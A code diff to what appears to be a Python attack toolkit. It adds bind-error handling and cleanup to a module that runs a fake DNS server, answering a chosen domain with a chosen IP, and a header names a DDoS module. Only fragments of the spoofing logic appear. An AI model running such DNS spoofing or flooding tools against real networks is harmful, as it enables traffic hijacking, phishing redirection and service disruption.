@@ -514,9 +514,21 @@ def mod_dnsspoof():
     if not dom or not ip: print("domain+ip required"); return
     ipb = bytes(int(x) for x in ip.split("."))
     stop = [False]
+    sock_box = [None]
+    bind_ok = [False]
     def serve():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.bind(("", port))
+        sock_box[0] = s
+        try:
+            s.bind(("", port))
+        except OSError as e:
+            if e.errno == 13:  # EACCES: permission denied
+                print(f"bind :{port} gagal ({e}) — butuh root (sudo/tsu)."); return
+            elif e.errno == 98:  # EADDRINUSE: already in use
+                print(f"bind :{port} gagal — port sudah dipakai (stop service lain)."); return
+            else:
+                print(f"bind :{port} gagal ({e}) — check port."); return
+        bind_ok[0] = True
         s.settimeout(1)
         print(f"fake DNS on :{port} — answering {dom} -> {ip} (ctrl-c stops)")
         while not stop[0]:
@@ -538,6 +550,7 @@ def mod_dnsspoof():
                 s.sendto(resp, addr)
             except Exception:
                 pass
+        s.close()
     t = threading.Thread(target=serve, daemon=True)
     t.start()
     try:
@@ -545,7 +558,11 @@ def mod_dnsspoof():
             time.sleep(1)
     except KeyboardInterrupt:
         stop[0] = True
-    print("fake DNS stopped.")
+        time.sleep(0.1)
+    if not bind_ok[0]:
+        print("fake DNS bind failed — nothing was served.")
+    else:
+        print("fake DNS stopped.")
     _save("dns", dom, f"{dom}->{ip}")
 
 # ---------------------------------------------------------------- ddos (bounded load test)
